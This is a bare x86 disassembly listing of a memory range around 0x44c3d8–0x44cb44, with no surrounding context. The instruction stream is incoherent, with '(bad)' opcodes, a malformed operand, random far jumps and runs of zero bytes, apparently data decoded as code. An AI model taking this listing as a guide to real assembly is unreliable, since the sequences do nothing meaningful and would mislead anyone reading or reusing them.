  44c3d8:	xchg   ecx,eax
  44c3d9:	mov    dl,0x1
  44c3db:	add    al,0x90
  44c3dd:	mov    dl,0x9a
  44c3df:	cmc    
  44c3e0:	std    
  44c3e1:	popf   
  44c3e2:	stc    
  44c3e3:	out    dx,al
  44c3e4:	add    BYTE PTR [eax],al
  44c3e6:	add    BYTE PTR [eax],al
  44c3e8:	add    al,ch
  44c3ea:	sahf   
  44c3eb:	shl    cl,1
  44c3ed:	jl     0x44c38b
  44c3ef:	jo     0x44c3e3
  44c3f1:	mov    al,0xaa
  44c3f3:	icebp  
  44c3f4:	jmp    0x44c44d
  44c3f6:	stos   BYTE PTR es:[edi],al
  44c3f7:	popf   
  44c3f8:	jmp    0xaae6:0xeb26ab5f
  44c3ff:	push   ds
  44c400:	out    dx,al
  44c401:	scas   al,BYTE PTR es:[edi]
  44c402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c403:	push   esi
  44c404:	in     eax,dx
  44c405:	pop    esi
  44c406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c407:	pop    edi
  44c408:	out    0x8b,eax
  44c40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c40b:	cmp    ch,dl
  44c40d:	scas   eax,DWORD PTR es:[edi]
  44c40e:	mul    BYTE PTR fs:[ebx-0x6f]
  44c412:	mov    dl,0x4d
  44c414:	add    al,0x90
  44c416:	mov    dl,0x9
  44c418:	repz shl DWORD PTR [edx-0x60150b02],cl
  44c41f:	cmp    esi,eax
  44c421:	or     eax,0x1aef4a9f
  44c426:	lahf   
  44c427:	call   0x7f71:0xe9f2bef
  44c42e:	sbb    eax,0xc976d423
  44c433:	and    DWORD PTR [ebx+0x3d21026e],eax
  44c439:	(bad)  
  44c43b:	and    BYTE PTR [ebp+0x41],al
  44c43e:	bound  esp,QWORD PTR [ecx]
  44c440:	lea    eax,[ecx-0x4d]
  44c443:	pop    ds
  44c444:	ret    0x7240
  44c447:	and    eax,0x2a9f2512
  44c44c:	add    BYTE PTR [eax],al
  44c44e:	add    BYTE PTR [eax],al
  44c450:	add    BYTE PTR [eax],al
  44c452:	cmp    BYTE PTR [ecx+0x2b],cl
  44c455:	js     0x44c485
  44c457:	icebp  
  44c458:	sub    bl,al
  44c45a:	sub    esi,ecx
  44c45c:	sub    BYTE PTR [eax],dh
  44c45e:	sub    DWORD PTR [edx-0x580703d9],esi
  44c464:	daa    
  44c465:	mov    dh,0xf8
  44c467:	xchg   DWORD PTR [eax],ebp
  44c469:	push   ebx
  44c46a:	call   0x842deccb
  44c46f:	mov    cl,0xe
  44c471:	jns    0x44c406
  44c473:	mov    dl,0xe
  44c475:	stos   DWORD PTR es:[edi],eax
  44c476:	jecxz  0x44c46e
  44c478:	push   ds
  44c479:	mov    ebx,fs
  44c47b:	push   ss
  44c47c:	pop    ds
  44c47d:	xor    bl,ah
  44c47f:	je     0x44c4a0
  44c481:	mov    al,dl
  44c483:	loopne 0x44c4a2
  44c485:	xor    al,0xc2
  44c487:	bound  ebx,QWORD PTR [esi]
  44c489:	test   ebp,0xbdbf1cca
  44c48f:	cmp    DWORD PTR ds:0x1d6aa515,ebx
  44c495:	out    0x9c,eax
  44c497:	mov    bl,0x1b
  44c499:	add    BYTE PTR [ebx-0x5cc8e43d],ah
  44c49f:	xor    DWORD PTR [ecx*4+0x3f1c8283],ebx
  44c4a6:	sbb    ch,0x22
  44c4a9:	add    BYTE PTR [edx+eiz*2],bl
  44c4ac:	div    BYTE PTR [eax+edi*1]
  44c4af:	bound  edx,QWORD PTR [eax]
  44c4b1:	xor    eax,0x3531619d
  44c4b6:	add    BYTE PTR [eax],al
  44c4b8:	add    BYTE PTR [eax],al
  44c4ba:	add    cl,bl
  44c4bc:	popa   
  44c4bd:	jns    0x44c4f4
  44c4bf:	fisub  WORD PTR [ecx-0x54]
  44c4c2:	xor    eax,0x35d561b8
  44c4c7:	cmp    DWORD PTR [ebp+0x8],edx
  44c4ca:	ss sahf 
  44c4cc:	push   esp
  44c4cd:	fwait
  44c4ce:	ss jmp 0xfe54:0xa36c553
  44c4d6:	test   DWORD PTR ss:[ebx+0x6b],edx
  44c4da:	cmp    edi,eax
  44c4dc:	push   ebp
  44c4dd:	fwait
  44c4de:	cmp    DWORD PTR [ebx],edx
  44c4e0:	push   ebp
  44c4e1:	test   BYTE PTR [ecx],bh
  44c4e3:	add    al,0x55
  44c4e5:	mov    ah,0x39
  44c4e7:	and    DWORD PTR [ebp-0x5d],edx
  44c4ea:	cmp    DWORD PTR [ebp-0x1ec5fdab],ebp
  44c4f0:	pop    eax
  44c4f1:	retf   
  44c4f2:	cmp    cl,bl
  44c4f4:	push   edi
  44c4f5:	xchg   ebx,eax
  44c4f6:	cmp    ebx,DWORD PTR [esi]
  44c4f8:	push   edi
  44c4f9:	iret   
  44c4fa:	cmp    eax,DWORD PTR [edx-0x11c404a9]
  44c500:	dec    edx
  44c501:	test   BYTE PTR [edx+eax*2],bh
  44c504:	pop    edx
  44c505:	cmc    
  44c506:	cmp    al,0xa0
  44c508:	pop    edx
  44c509:	loope  0x44c547
  44c50b:	retf   
  44c50c:	pop    ecx
  44c50d:	cld    
  44c50e:	cmp    al,0xfc
  44c510:	pop    ecx
  44c511:	cmp    al,0x3d
  44c513:	mov    esi,0x23ee44c
  44c518:	dec    esp
  44c519:	jo     0x44c55a
  44c51b:	cs dec ebx
  44c51d:	lods   eax,DWORD PTR ds:[esi]
  44c51e:	aas    
  44c51f:	add    BYTE PTR [eax],al
  44c521:	add    BYTE PTR [eax],al
  44c523:	add    BYTE PTR [edi-0x560017b5],dh
  44c529:	out    dx,al
  44c52a:	or     eax,0xc3b9000
  44c52f:	add    BYTE PTR [eax-0x3fba1d3e],dl
  44c535:	xchg   edx,eax
  44c536:	loop   0x44c59b
  44c538:	shr    BYTE PTR [eax-0x55f821e],0xdb
  44c53f:	lahf   
  44c540:	mov    al,ds:0xa0b9dc34
  44c545:	push   cs
  44c546:	fmul   st(3),st
  44c548:	mov    al,ds:0x80eedc20
  44c54d:	dec    edx
  44c54e:	jecxz  0x44c564
  44c550:	xor    DWORD PTR [edi-0x1d],0xde55820c
  44c557:	data16 adc dh,0xdd
  44c55b:	retf   
  44c55c:	bound  ecx,QWORD PTR [eax-0x22]
  44c55f:	lock bound esi,QWORD PTR [ebx-0x23]
  44c563:	or     DWORD PTR [esi+esi*4-0x22],esp
  44c567:	inc    eax
  44c568:	pop    esp
  44c569:	jb     0x44c563
  44c56b:	xchg   ah,al
  44c56d:	jne    0x44c54e
  44c56f:	outs   dx,DWORD PTR ds:[esi]
  44c570:	mov    ebp,0xc5a7ded0
  44c575:	out    dx,al
  44c576:	fisub  WORD PTR [edi]
  44c578:	mov    esi,0xa687fa20
  44c57d:	(bad)  
  44c57e:	stc    
  44c57f:	popf   
  44c580:	sahf   
  44c581:	arpl   cx,di
  44c583:	xor    eax,0x44f910a7
  44c588:	add    BYTE PTR [eax],al
  44c58a:	add    BYTE PTR [eax],al
  44c58c:	add    BYTE PTR [edi-0x78a206e0],bl
  44c592:	cmp    ecx,edi
  44c594:	imul   edi,DWORD PTR [edi-0x27],0xfffffff8
  44c598:	pop    DWORD PTR [edi+0x7fa7f901]
  44c59e:	lock clc 
  44c5a0:	scas   al,BYTE PTR es:[edi]
  44c5a1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  44c5a3:	clc    
  44c5a4:	(bad)  
  44c5a5:	pop    edi
  44c5a6:	pop    ebx
  44c5a7:	cli    
  44c5a8:	push   es
  44c5a9:	pop    eax
  44c5aa:	mov    dl,0xe
  44c5ac:	in     al,dx
  44c5ad:	pop    ebp
  44c5ae:	call   0xec59:0x9ae8ec25
  44c5b5:	dec    esp
  44c5b6:	call   0xeb42:0x9bc9eae7
  44c5bd:	sub    bl,BYTE PTR [ebx-0x611916ec]
  44c5c3:	inc    edi
  44c5c4:	call   0xe73563ef
  44c5c9:	or     ebx,DWORD PTR [edi-0x5f4c1a1f]
  44c5cf:	ret    
  44c5d0:	in     eax,0xd5
  44c5d2:	mov    al,ds:0xa00ae5ff
  44c5d7:	xchg   dh,ah
  44c5d9:	jns    0x44c57c
  44c5db:	ds in  eax,0x37
  44c5de:	popa   
  44c5df:	not    BYTE PTR [ebx-0x6f]
  44c5e2:	mov    dl,0xc1
  44c5e4:	add    dl,BYTE PTR [eax+0x5af3a0b2]
  44c5ea:	mov    ds:0xa254f3b6,al
  44c5ef:	mov    ds:0xf3,eax
  44c5f4:	add    BYTE PTR [eax],al
  44c5f6:	addr16 mov ds:0xf3d8,al
  44c5fa:	ins    DWORD PTR es:[edi],dx
  44c5fb:	mov    ds:0xa3c3f41f,al
  44c600:	inc    eax
  44c601:	repz in eax,0xa2
  44c604:	repz icebp 
  44c606:	xchg   edi,eax
  44c607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c608:	mov    esp,0xaba4b0f1
  44c60d:	icebp  
  44c60e:	inc    eax
  44c60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c610:	cmp    esi,edx
  44c612:	retf   0xdba3
  44c615:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c618:	mov    ebp,0x80a58bf0
  44c61d:	lock movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  44c620:	ds icebp 
  44c622:	cld    
  44c623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c624:	retf   0x73ef
  44c627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c628:	push   cs
  44c629:	test   al,0xb7
  44c62b:	stc    
  44c62c:	and    al,BYTE PTR [ecx-0x44dcae51]
  44c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c633:	bound  esp,QWORD PTR [edx]
  44c635:	aas    
  44c636:	jle    0x44c64f
  44c638:	and    DWORD PTR [ebp-0x52de958b],edx
  44c63e:	ins    DWORD PTR es:[edi],dx
  44c63f:	dec    ebp
  44c640:	and    DWORD PTR [edi],eax
  44c642:	gs hlt 
  44c644:	pop    ds
  44c645:	inc    edi
  44c646:	jge    0x44c62b
  44c648:	pop    ds
  44c649:	popa   
  44c64a:	je     0x44c66f
  44c64c:	and    BYTE PTR [esi-0x6df7994],ah
  44c652:	imul   edx,DWORD PTR [esi+eiz*1+0x26fb3c24],0x18
  44c65a:	add    BYTE PTR [eax],al
  44c65c:	add    BYTE PTR [eax],al
  44c65e:	add    BYTE PTR [edx+esi*1],dh
  44c661:	daa    
  44c662:	jno    0x44c68f
  44c664:	adc    al,0x27
  44c666:	cmp    ebp,DWORD PTR [ebx]
  44c668:	jns    0x44c691
  44c66a:	js     0x44c6a7
  44c66c:	les    esp,FWORD PTR ds:0x25ef3ab2
  44c672:	or     eax,0x7325cb2b
  44c677:	sub    dh,BYTE PTR [eax]
  44c679:	es xchg edx,edi
  44c67c:	test   BYTE PTR [esi],ah
  44c67e:	ss cli 
  44c680:	dec    ebp
  44c681:	es dec ebp
  44c683:	jmp    0x249a:0xea0b24ae
  44c68a:	(bad)  
  44c68b:	stc    
  44c68c:	cli    
  44c68d:	and    al,0xc7
  44c68f:	stc    
  44c690:	fldenv [eax+ebx*2]
  44c693:	jmp    0xe99aebc8
  44c698:	sbb    ah,BYTE PTR ds:0x256db939
  44c69e:	pop    es
  44c69f:	mov    ecx,0xa8de2567
  44c6a4:	scas   al,BYTE PTR es:[edi]
  44c6a5:	and    eax,DWORD PTR [eax]
  44c6a7:	fisttp WORD PTR [edx+0x25]
  44c6aa:	cmp    ecx,DWORD PTR [ebx]
  44c6ac:	dec    ebx
  44c6ad:	inc    eax
  44c6ae:	cmp    esi,DWORD PTR [ecx]
  44c6b0:	dec    edx
  44c6b1:	cmp    BYTE PTR [ebx],0x53
  44c6b4:	dec    edx
  44c6b5:	test   al,0x3b
  44c6b7:	fidivr WORD PTR [edi-0x36]
  44c6ba:	cmp    ebx,DWORD PTR [ebp+0x7f]
  44c6bd:	or     al,0x3c
  44c6bf:	jge    0x44c740
  44c6c1:	sub    al,0x3c
  44c6c3:	add    BYTE PTR [eax],al
  44c6c5:	add    BYTE PTR [eax],al
  44c6c7:	add    BYTE PTR [edi-0x2fc3abae],cl
  44c6cd:	push   edx
  44c6ce:	iret   
  44c6cf:	cmp    al,0x5b
  44c6d1:	push   edx
  44c6d2:	daa    
  44c6d3:	cmp    eax,0x3d4a5185
  44c6d8:	les    edx,FWORD PTR [ecx-0x52]
  44c6db:	cmp    eax,0x3dd85120
  44c6e0:	pop    es
  44c6e1:	push   ecx
  44c6e2:	mov    esp,0xdc510f3d
  44c6e7:	cmp    eax,0x3e00515c
  44c6ec:	inc    ebp
  44c6ed:	push   ecx
  44c6ee:	ss ds push eax
  44c6f1:	push   ecx
  44c6f2:	pop    esp
  44c6f3:	ds cmc 
  44c6f5:	push   ebx
  44c6f6:	idiv   BYTE PTR [esi]
  44c6f8:	mov    al,ds:0x713f0a54
  44c6fd:	push   ebx
  44c6fe:	push   esi
  44c6ff:	aas    
  44c700:	fist   WORD PTR [ebx-0x65]
  44c703:	aas    
  44c704:	adc    DWORD PTR [ebx-0x5d],edx
  44c707:	aas    
  44c708:	mov    esi,0xe9ffe853
  44c70d:	xchg   edx,eax
  44c70e:	or     eax,0xeb32900
  44c713:	add    BYTE PTR [edi-0x5cfe37a],dl
  44c719:	or     BYTE PTR [edi-0x4795cd0],0x30
  44c720:	and    al,0x86
  44c722:	mov    ?,WORD PTR [ecx]
  44c724:	nop
  44c725:	rol    cl,1
  44c727:	mov    al,ds:0x34c1c681
  44c72c:	add    BYTE PTR [eax],al
  44c72e:	add    BYTE PTR [eax],al
  44c730:	add    BYTE PTR [edx+0x6266c22c],al
  44c736:	retf   
  44c737:	ror    BYTE PTR [ecx-0x3c3efa9e],0x62
  44c73e:	xor    ecx,eax
  44c740:	js     0x44c7a5
  44c742:	out    0xc0,al
  44c744:	mov    es,ebx
  44c746:	das    
  44c747:	shl    DWORD PTR [esi-0x44],0x1a
  44c74b:	(bad)  
  44c74c:	fadd   st(6),st
  44c74e:	jns    0x44c716
  44c750:	std    
  44c751:	mov    esi,0xa72cc3c1
  44c756:	xchg   esi,eax
  44c757:	ret    
  44c758:	pop    eax
  44c759:	lahf   
  44c75a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c75b:	ret    
  44c75c:	push   ds
  44c75d:	cwde   
  44c75e:	adc    eax,esp
  44c760:	aas    
  44c761:	cdq    
  44c762:	mov    ds:0xe98950c9,eax
  44c767:	retf   0x89a9
  44c76a:	add    bl,cl
  44c76c:	mov    ebp,0x9cc8a279
  44c771:	jp     0x44c793
  44c773:	retf   0x6d18
  44c776:	addr16 out dx,eax
  44c778:	out    0x65,al
  44c77a:	mov    ah,ch
  44c77c:	or     eax,0xffed275f
  44c781:	pop    ss
  44c782:	dec    esp
  44c783:	cld    
  44c784:	add    BYTE PTR [eax-0x6ffff389],dl
  44c78a:	test   al,0xc2
  44c78c:	mov    eax,ds:0xf3bc44c0
  44c791:	shl    BYTE PTR [ebx+eax*8+0x8],0x0
  44c796:	add    BYTE PTR [eax],al
  44c798:	add    BYTE PTR [eax],al
  44c79a:	mov    ds:0xa35cc109,eax
  44c79f:	rol    eax,1
  44c7a1:	lahf   
  44c7a2:	mov    ds:0x9c8cc011,eax
  44c7a7:	mov    dl,0x19
  44c7a9:	xlat   BYTE PTR ds:[ebx]
  44c7aa:	nop
  44c7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c7ac:	(bad)  
  44c7ad:	fadd   DWORD PTR [ebp+0x4ed9baa7]
  44c7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c7b4:	jge    0x44c78f
  44c7b6:	push   es
  44c7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c7b8:	cmp    ebx,ecx
  44c7ba:	test   al,0xa4
  44c7bc:	call   0x9dea6099
  44c7c1:	fisubr DWORD PTR ds:0x93da41a5
  44c7c7:	call   0xdbae:0x9c09daf9
  44c7ce:	fcomp  DWORD PTR [eax-0x67a5219b]
  44c7d4:	jne    0x44c7b3
  44c7d6:	and    ebx,DWORD PTR [ecx-0x6136222c]
  44c7dc:	jo     0x44c7be
  44c7de:	pop    eax
  44c7df:	sahf   
  44c7e0:	imul   ebx,edi,0xffffffb4
  44c7e3:	pushf  
  44c7e4:	inc    esi
  44c7e5:	loop   0x44c84b
  44c7e7:	pushf  
  44c7e8:	add    ah,cl
  44c7ea:	(bad)  
  44c7eb:	pushf  
  44c7ec:	cmc    
  44c7ed:	add    edx,DWORD PTR [edx-0x6ffb9e4e]
  44c7f3:	mov    dl,0x31
  44c7f5:	aam    0x8
  44c7f7:	mov    ds:0xa0ded498,al
  44c7fc:	sbb    dh,dl
  44c7fe:	add    BYTE PTR [eax],al
  44c800:	add    BYTE PTR [eax],al
  44c802:	add    BYTE PTR [edi],al
  44c804:	mov    al,ds:0xa153d56b
  44c809:	mov    ebp,ss
  44c80b:	enter  0xd9a7,0xd6
  44c80f:	adc    BYTE PTR [edi-0x58df28a5],ah
  44c815:	xlat   BYTE PTR ds:[bx]
  44c817:	pop    ds
  44c818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c819:	mov    ss,edi
  44c81b:	sub    al,0xa7
  44c81d:	arpl   di,dx
  44c81f:	sub    BYTE PTR [edi-0x593628cd],ah
  44c825:	push   cs
  44c826:	add    al,0xba
  44c828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c829:	and    BYTE PTR [esi+0x5f210cb9],ah
  44c82f:	jmp    0x1ff4:0xe8ab214b
  44c836:	dec    eax
  44c837:	fadd   st(5),st
  44c839:	and    eax,0x25f7dad8
  44c83e:	push   0x32686cb
  44c843:	retf   
  44c844:	jmp    0x20025a6d
  44c849:	and    eax,0x238bb608
  44c84e:	cmp    DWORD PTR [ebp+0x5],ebp
  44c851:	and    al,0x44
  44c853:	gs loopne 0x44c879
  44c856:	imul   ebx,DWORD PTR [eax+esi*1+0x24],0xffffff88
  44c85b:	push   esp
  44c85c:	dec    edx
  44c85d:	and    al,0xda
  44c85f:	dec    edi
  44c860:	xchg   ebx,eax
  44c861:	sub    dh,BYTE PTR [ebx]
  44c863:	jo     0x44c836
  44c865:	sub    dh,BYTE PTR [eax+eax*1]
  44c868:	add    BYTE PTR [eax],al
  44c86a:	add    BYTE PTR [eax],al
  44c86c:	jo     0x44c8d3
  44c86e:	sub    esp,ecx
  44c870:	ss mov ch,0x29
  44c873:	std    
  44c874:	outs   dx,BYTE PTR ds:[esi]
  44c875:	(bad)  
  44c876:	sub    esi,eax
  44c878:	xchg   si,ax
  44c87a:	sub    ebx,ebx
  44c87c:	pop    esi
  44c87d:	lea    ebp,[ecx]
  44c87f:	iret   
  44c880:	push   esi
  44c881:	stc    
  44c882:	sub    DWORD PTR [edi],ecx
  44c884:	xor    ch,BYTE PTR ds:0x7b31b129
  44c88a:	sub    DWORD PTR [ebp+0x31],edi
  44c88d:	mul    BYTE PTR [edi]
  44c88f:	sub    eax,0xe9286d30
  44c894:	add    esi,DWORD PTR [edx-0x4d6cfef2]
  44c89a:	push   cs
  44c89b:	jmp    0xb9638e83
  44c8a0:	jecxz  0x44c86a
  44c8a2:	push   ds
  44c8a3:	add    BYTE PTR [ebp+0x7f],cl
  44c8a6:	sahf   
  44c8a7:	xor    BYTE PTR [ebp-0x2cf1b81],dh
  44c8ad:	sub    BYTE PTR [edi+0x31],0x22
  44c8b1:	cmp    DWORD PTR [ecx-0x217f70cf],0x15807131
  44c8bb:	xor    ch,al
  44c8bd:	test   DWORD PTR [ecx],ebp
  44c8bf:	xor    al,BYTE PTR [edx]
  44c8c1:	xchg   BYTE PTR [ecx+0x32],dh
  44c8c4:	cmp    al,BYTE PTR [ebp-0x7aa9cd67]
  44c8ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c8cb:	xor    cl,BYTE PTR [edx+0x32fd85]
  44c8d1:	add    BYTE PTR [eax],al
  44c8d3:	add    BYTE PTR [eax],al
  44c8d5:	aad    0x86
  44c8d7:	push   ebx
  44c8d8:	xor    ebp,edi
  44c8da:	jg     0x44c947
  44c8dc:	xor    ebx,DWORD PTR ds:0x6233a87f
  44c8e2:	jg     0x44c8cc
  44c8e4:	xor    ebp,DWORD PTR [ebx+eax*4+0x16]
  44c8e8:	xor    al,0x66
  44c8ea:	adc    DWORD PTR [esp+esi*1],0x70
  44c8ee:	add    DWORD PTR [edx],0x34
  44c8f1:	mov    bh,BYTE PTR [edx+0x30]
  44c8f4:	xor    al,0x54
  44c8f6:	sbb    DWORD PTR [esi],0x34
  44c8f9:	outs   dx,BYTE PTR ds:[esi]
  44c8fa:	sbb    DWORD PTR [esp+esi*1],0x78
  44c8fe:	jp     0x44c92a
  44c900:	xor    al,0x72
  44c902:	jp     0x44c95c
  44c904:	xor    al,0x7c
  44c906:	jp     0x44c94e
  44c908:	xor    al,0x76
  44c90a:	jp     0x44c950
  44c90c:	xor    al,0x80
  44c90e:	jp     0x44c982
  44c910:	xor    al,0x1a
  44c912:	and    DWORD PTR [eax+0x34],0x24
  44c916:	or     DWORD PTR [esi-0x738581cc],0x34
  44c91d:	mov    BYTE PTR [edx-0x66],bh
  44c920:	xor    al,0x90
  44c922:	loopne 0x44c8ea
  44c924:	lahf   
  44c925:	mov    esp,0xa4a9c736
  44c92a:	inc    esp
  44c92b:	(bad)  
  44c92c:	stos   DWORD PTR es:[edi],eax
  44c92d:	pushf  
  44c92e:	xor    al,bh
  44c930:	mov    ch,0xa4
  44c932:	mov    dh,al
  44c934:	(bad)  
  44c935:	pushf  
  44c936:	mov    esi,0xd1c6
  44c93b:	add    BYTE PTR [eax],al
  44c93d:	add    BYTE PTR [esp+ebx*4-0x55832c3a],al
  44c944:	(bad)  
  44c945:	fld    QWORD PTR [eax+esi*4-0x3983103a]
  44c94c:	(bad)  
  44c94d:	stc    
  44c94e:	fs mov ah,0xc6
  44c951:	sti    
  44c952:	pop    esp
  44c953:	(bad)  
  44c954:	mov    DWORD PTR ds:0x17c77865,0x21c76e5d
  44c95e:	lds    ebp,FWORD PTR [eax-0x4542dc3b]
  44c964:	lds    ebp,FWORD PTR ds:0x3fc5c4c5
  44c96a:	mov    ebp,0xa549c58e
  44c96f:	mov    al,ds:0x929d4bc5
  44c974:	lds    edx,FWORD PTR [ebp-0x5b]
  44c977:	in     al,dx
  44c978:	lds    esp,FWORD PTR [edi-0x63]
  44c97b:	test   esi,0xc1c685c3
  44c981:	mov    edi,0x25c2107e
  44c986:	xchg   esp,edi
  44c988:	rcr    bh,0x7f
  44c98b:	push   ds
  44c98c:	(bad)  
  44c98d:	in     eax,0x68
  44c98f:	inc    edi
  44c990:	retf   
  44c991:	or     ch,BYTE PTR [ecx-0x57]
  44c994:	leave  
  44c995:	test   BYTE PTR [ecx+0x7b],bl
  44c998:	mov    BYTE PTR [ecx+0x5a],0xcd
  44c99c:	lds    eax,FWORD PTR [edi-0x24cd4d36]
  44c9a2:	add    BYTE PTR [eax],al
  44c9a4:	add    BYTE PTR [eax],al
  44c9a6:	add    BYTE PTR [esi+edx*4+0x14],dh
  44c9aa:	loope  0x44c9e3
  44c9ac:	cwde   
  44c9ad:	sbb    bl,bh
  44c9af:	scas   al,BYTE PTR es:[edi]
  44c9b0:	cdq    
  44c9b1:	outs   dx,DWORD PTR ds:[esi]
  44c9b2:	ficom  WORD PTR ds:0x1dde689a
  44c9b8:	call   0xe3f6:0x59dfde54
  44c9bf:	xchg   ecx,eax
  44c9c0:	mov    dl,0x81
  44c9c2:	add    edx,DWORD PTR [eax-0x42c9c4e]
  44c9c8:	mov    ds:0xa3e0d45b,al
  44c9cd:	aam    0xd1
  44c9cf:	or     BYTE PTR [ebp-0x5a1d2db9],ah
  44c9d5:	or     eax,0x889e7cd2
  44c9da:	xlat   BYTE PTR ds:[ebx]
  44c9db:	push   ss
  44c9dc:	lahf   
  44c9dd:	dec    esp
  44c9de:	fcomp  st(3)
  44c9e0:	lahf   
  44c9e1:	adc    eax,0x199f8fd8
  44c9e6:	(bad)  
  44c9e7:	scas   eax,DWORD PTR es:[edi]
  44c9e8:	mov    al,ds:0xa0afd619
  44c9ed:	or     esi,edx
  44c9ef:	mov    edi,0xafd619a0
  44c9f4:	mov    al,ds:0xa0cfd639
  44c9f9:	cmp    esi,edx
  44c9fb:	iret   
  44c9fc:	mov    al,ds:0xa0bfd609
  44ca01:	sbb    esi,edx
  44ca03:	out    dx,eax
  44ca04:	mov    al,ds:0x9cd4d51c
  44ca09:	jbe    0x44c9e4
  44ca0b:	add    BYTE PTR [eax],al
  44ca0d:	add    BYTE PTR [eax],al
  44ca0f:	add    BYTE PTR [ebp-0x63],cl
  44ca12:	neg    edi
  44ca14:	and    ebx,DWORD PTR [ecx-0x4d6e2c0b]
  44ca1a:	sub    eax,0x3eb29003
  44ca1f:	rcr    ch,cl
  44ca21:	mov    ds:0xfc40cb0e,eax
  44ca26:	sbb    ebx,DWORD PTR [esi-0x1f]
  44ca29:	imul   ebx,DWORD PTR [eax+ebp*8],0x512106df
  44ca30:	out    0xa8,al
  44ca32:	and    eax,0x25c0dafd
  44ca37:	in     eax,dx
  44ca38:	retf   0x25b8
  44ca3b:	or     eax,0xd2590cb
  44ca40:	mov    ebx,0xbafd2588
  44ca45:	mov    al,ds:0x98eaed25
  44ca4a:	and    eax,0x25f0eaad
  44ca4f:	lods   eax,DWORD PTR ds:[esi]
  44ca50:	(bad)  
  44ca52:	and    eax,0x2600dabd
  44ca57:	lods   eax,DWORD PTR ds:[esi]
  44ca58:	retf   0x25f8
  44ca5b:	(bad)  
  44ca5c:	retf   0x25d0
  44ca5f:	lea    edi,[edx-0x4582da38]
  44ca65:	loopne 0x44ca8c
  44ca67:	ins    DWORD PTR es:[edi],dx
  44ca68:	push   0xffffffd8
  44ca6a:	and    eax,0x26306a6d
  44ca6f:	ins    DWORD PTR es:[edi],dx
  44ca70:	pop    edx
  44ca71:	sub    BYTE PTR [esi],ah
  44ca73:	jge    0x44ca75
  44ca75:	add    BYTE PTR [eax],al
  44ca77:	add    BYTE PTR [eax],al
  44ca79:	pop    edx
  44ca7a:	inc    eax
  44ca7b:	es ins DWORD PTR es:[edi],dx
  44ca7d:	dec    edx
  44ca7e:	cmp    BYTE PTR [esi],ah
  44ca80:	lea    ecx,[edx+0x10]
  44ca83:	lea    edi,es:[edx]
  44ca86:	or     BYTE PTR [esi],ah
  44ca88:	jge    0x44cac4
  44ca8a:	and    BYTE PTR [esi],ah
  44ca8c:	ins    DWORD PTR es:[edi],dx
  44ca8d:	push   0x18
  44ca8f:	lods   eax,DWORD PTR es:[esi]
  44ca91:	push   0x70
  44ca93:	lods   eax,DWORD PTR es:[esi]
  44ca95:	pop    edx
  44ca96:	push   0x805abd26
  44ca9b:	lods   eax,DWORD PTR es:[esi]
  44ca9d:	dec    edx
  44ca9e:	js     0x44cac6
  44caa0:	add    BYTE PTR ds:0xd39f07d,dl
  44caa6:	jge    0x44caa0
  44caa8:	cmp    DWORD PTR [ebp+0x7d39e07c],edx
  44caae:	jl     0x44ca98
  44cab0:	cmp    ebp,esi
  44cab2:	jns    0x44cac4
  44cab4:	cmp    ch,ch
  44cab6:	jns    0x44cad0
  44cab8:	cmp    dh,ch
  44caba:	jns    0x44cabc
  44cabc:	cmp    bh,ch
  44cabe:	jns    0x44cac8
  44cac0:	cmp    dl,BYTE PTR [ebp-0x72c5cf84]
  44cac6:	jl     0x44cb00
  44cac8:	cmp    dl,ch
  44caca:	jns    0x44cb4b
  44cacc:	cmp    esi,DWORD PTR [ecx+0x7a]
  44cacf:	repz cmp eax,ebx
  44cad2:	ja     0x44cb22
  44cad4:	cmp    al,0x66
  44cad6:	ja     0x44cab2
  44cad8:	cmp    al,0x7e
  44cada:	ja     0x44caa6
  44cadc:	cmp    al,0x0
  44cade:	add    BYTE PTR [eax],al
  44cae0:	add    BYTE PTR [eax],al
  44cae2:	lods   eax,DWORD PTR ds:[esi]
  44cae3:	js     0x44cac7
  44cae5:	cmp    al,0xb4
  44cae7:	js     0x44cb00
  44cae9:	cmp    eax,0x3d0378b9
  44caee:	retf   0x3778
  44caf1:	cmp    eax,0x3d20784e
  44caf6:	lods   al,BYTE PTR ds:[esi]
  44caf7:	jns    0x44cb47
  44caf9:	cmp    eax,0x3d5279c1
  44cafe:	mov    ch,0x79
  44cb00:	inc    esi
  44cb01:	cmp    eax,0x3d4a79d9
  44cb06:	mov    ebp,0xd13d5e79
  44cb0b:	jns    0x44caa4
  44cb0d:	cmp    eax,0x3da779ee
  44cb12:	push   esp
  44cb13:	jns    0x44cb08
  44cb15:	cmp    eax,0x3e0c7936
  44cb1a:	popa   
  44cb1b:	jns    0x44cb58
  44cb1d:	ds nop
  44cb1f:	add    dh,0x48
  44cb22:	outs   dx,BYTE PTR ds:[esi]
  44cb23:	scas   al,BYTE PTR es:[edi]
  44cb24:	les    ebp,FWORD PTR [edi+0x66]
  44cb27:	push   esi
  44cb28:	(bad)  
  44cb29:	jg     0x44cb89
  44cb2b:	into   
  44cb2c:	les    ecx,FWORD PTR [edi-0x603b09aa]
  44cb32:	into   
  44cb33:	out    dx,al
  44cb34:	(bad)
  44cb38:	(bad)  
  44cb39:	(bad)  
  44cb3a:	mov    esi,0xb701c4d3
  44cb3f:	dec    eax
  44cb40:	lds    eax,FWORD PTR [esi]
  44cb42:	scas   eax,DWORD PTR es:[edi]
  44cb43:	pop    ebp
  44cb44:	lds    edx,FWORD PTR [ebx]
